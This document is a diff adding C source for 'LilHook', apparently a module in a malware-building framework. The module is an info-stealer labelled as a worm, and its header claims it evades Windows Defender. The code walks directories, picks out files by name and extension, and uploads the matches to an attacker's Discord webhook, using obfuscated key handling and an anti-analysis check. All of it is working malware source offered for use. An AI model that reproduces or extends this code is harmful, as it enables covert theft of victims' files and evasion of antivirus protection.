@@ -1,0 +1,108 @@
+#!name##LilHook
+#!itemType##worm
+#!info##A simple file stealer. It recursively searches the specified paths for the target files and sends them to the Discord server. It includes various search filters. It requires a Discord Webhook.
+#!info## Tested on Windows 10 and 11; Defender does not detect it.
+#!lang##c
+#!itemTags##WIN##EXE
+#!wormCompiler##Basic-C
+#!Wprocess##BasicProc
+#!inFile##LilNemo##little_nemo.h
+#!inFile##LilNemo_Core_H##little_nemo_core.h
+#!inFile##LilNemo_Core_C##little_nemo_core.c
+#!inFile##LilNemo_Food_H##little_nemo_food.h
+#!inFile##LilNemo_Food_C##little_nemo_food.c
+#!inFile##LilNemo_Bag_H##little_nemo_bag.h
+#!inFile##LilNemo_Bag_C##little_nemo_bag.c
+#!inFile##LilNemo_Candy_H##little_nemo_candy.h
+#!inFile##LilNemo_Candy_C##little_nemo_candy.c
+#!inFile##LilNemo_CandyHook_H##lil_nemo_candy_dchook.h
+#!inFile##LilNemo_CandyHook_C##lil_nemo_candy_dchook.c
+#!inFile##LilNemo_CandyFile_H##lil_nemo_candy_file.h
+#!inFile##LilNemo_CandyFile_C##lil_nemo_candy_file.c
+#!inFile##LilNemo_CandyAnti_H##lil_nemo_candy_anti.h
+#!inFile##LilNemo_CandyAnti_C##lil_nemo_candy_anti.c
+#!reqMod##LittleNemo##LittleNemoCandy
+#!Var##LHK_key##abcd##A key for hashing function names, offsets, etc. It may contain lowercase letters, uppercase letters, and numbers. Ex: dJ8uU6d, aBcD1234 etc.##str
+#!Var##LHK_power##34##Additional parameter that modifies each character of the encryption key. Must be a integer.##str
+#!preRT##_LNSHADOW##LilNemoShadow##LHK_key##LHK_power
+
+
+
+
+
+
+#define LITTLE_NEMO_BAG
+#define LITTLE_NEMO_CANDY
+#define LITTLE_NEMO_CANDY_DCHOOK
+#define LITTLE_NEMO_CANDY_FILE
+#define LITTLE_NEMO_CANDY_ANTI
+#include "little_nemo.h"
+
+
+
+pLIL_NEMO_DC_HOOK nHOOK;
+
+uint16_t* lhook_obtain_key_hook(void) {
+    uint16_t rawkey[] = {
+        {{_LNSHADOW.showKeyHex(LHK_key[1:])}}
+    };
+    uint16_t rkey_size = sizeof(rawkey) / sizeof(uint16_t);
+    uint16_t kpart = lil_nemo_candy_anti_scout({{_LNSHADOW.showKeyPart(0)}});
+    uint16_t ekey_size = (rkey_size * sizeof(uint16_t)) + sizeof(uint16_t);
+    uint16_t *ekey = malloc(ekey_size);
+    memset(ekey, 0, rkey_size + sizeof(uint16_t));
+    if (kpart == 0) {
+        for (int i=0; i<rkey_size; i++) {
+            ekey[i] = rawkey[i];
+        }
+    }
+    else {
+        ekey[0] = kpart;
+        for (int i=0; i<rkey_size; i++) {
+            ekey[i+1] = rawkey[i];
+        }
+    }
+    return ekey;
+}
+
+
+int process_file(char *fpath, char *fname, pLIL_NEMO_FILE_BASIC fbag) {
+    const char *fext = fbag->findExt(fpath);
+    BYTE *tar_file;
+    DWORD fsize;
+    if (fbCheckFileName(fname, fbag) == 0) {
+        return 0;
+    }
+    if (fbCheckFileExt(fext, fbag) == 1) {
+        tar_file = fbLoadFile(fpath, &fsize);
+        nHOOK->send_file(tar_file, fsize, fname, nHOOK);
+    }
+    return 1;
+}
+
+int process_dir(char *fpath, char *dir_name, pLIL_NEMO_FILE_BASIC fbag) {
+    if (fbCheckDirName(dir_name, fbag) == 1) {
+        return 1;
+    }
+    return 0;
+}
+
+
+
+int main(void) {
+    srand((unsigned)time(NULL));
+    uint16_t *hkey = lhook_obtain_key_hook();
+    pLIL_NEMO_DC_HOOK nhook = nhMakeNemoHook(hkey, hkey);
+    pLIL_NEMO_FILE_BASIC fbag = fbMakeFileBag(hkey, hkey);
+    free(hkey);
+    nHOOK = nhook;
+    for (int i=0; i<fbag->start_path_size; i++) {
+        fbWalkDir(fbag->start_path[i], fbag, process_dir, process_file);
+    }
+
+
+    nhook->clear(nhook);
+    fbag->clear(fbag);
+
+    return 0;
+}
